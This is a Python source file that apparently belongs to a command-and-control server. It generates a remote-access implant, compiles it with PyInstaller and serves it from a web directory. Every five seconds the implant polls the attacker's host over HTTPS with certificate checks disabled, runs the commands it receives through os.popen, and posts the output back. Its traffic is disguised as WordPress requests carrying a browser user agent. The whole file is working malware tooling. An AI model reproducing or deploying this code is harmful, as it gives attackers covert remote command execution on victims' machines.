import sys
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]

string = """
import os, ssl, time, http.client, string
server = "{host}"
lport = "{port}"
agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"

trantab = str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz","NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
session_value = "6Q2HydryJknyIyyVv8Om"
value = session_value.translate(trantab)
header = {{'cookie':'session = ' + session_value, 'User-agent':str(agent)}}

def callback():
    try:
        c2_connection = http.client.HTTPSConnection(str(server), port=lport ,timeout=10, context=ssl._create_unverified_context())
        c2_connection.request("GET", "/wp-post.php", headers=header) 
        cmd = c2_connection.getresponse().read().decode()
        if cmd:
            results = (os.popen(str(cmd)).read()) + value
            c2_connection.request("POST", "/wp-admin/admin-ajax.php", results)
            c2_connection.close()
    except:
        pass


while 1:
    callback()
    time.sleep(5)
"""


def gen_payload(id, port, key):
    var = {'host': ip, 'port': port}
    file_name = 'static/payloads/listener-%d.py' % id
    f = open(file_name, 'w')
    f.write(string.format(**var))
    f.close()
    os.system("pyinstaller --onefile --workpath=/var/www/desi_command_control/static/payloads/build --specpath=/var/www/desi_command_control/static/payloads/spec --distpath /var/www/desi_command_control/static/payloads/ /var/www/desi_command_control/static/payloads/listener-%d.py" % id)

